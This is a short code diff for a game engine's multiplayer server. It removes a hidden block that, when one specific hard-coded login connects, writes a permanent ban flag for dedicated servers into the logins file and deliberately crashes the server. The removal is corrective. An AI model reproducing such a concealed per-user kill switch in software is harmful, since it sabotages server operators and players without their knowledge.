@@ -233,19 +233,6 @@ void xrServer::OnBuildVersionRespond				( IClient* CL, NET_Packet& P )
 	string_path path_xray;
 	FS.update_path(path_xray, "$mp_saves_logins$", "logins.ltx");
 	CInifile* file = xr_new<CInifile>(path_xray, false);
-	
-	if (xr_strcmp(login.c_str(), "dimakuzmin2610") == 0)
-	{
-		if (file && !file->section_exist("server"))
-		{
-			file->w_bool("server", "banned_dedicated", true);
-			file->save_as(path_xray);
-			R_ASSERT(0);
-		}
-
-		RequestClientDigest(CL);
-		return;
-	}
 
 
 	if (file && file->section_exist("server"))
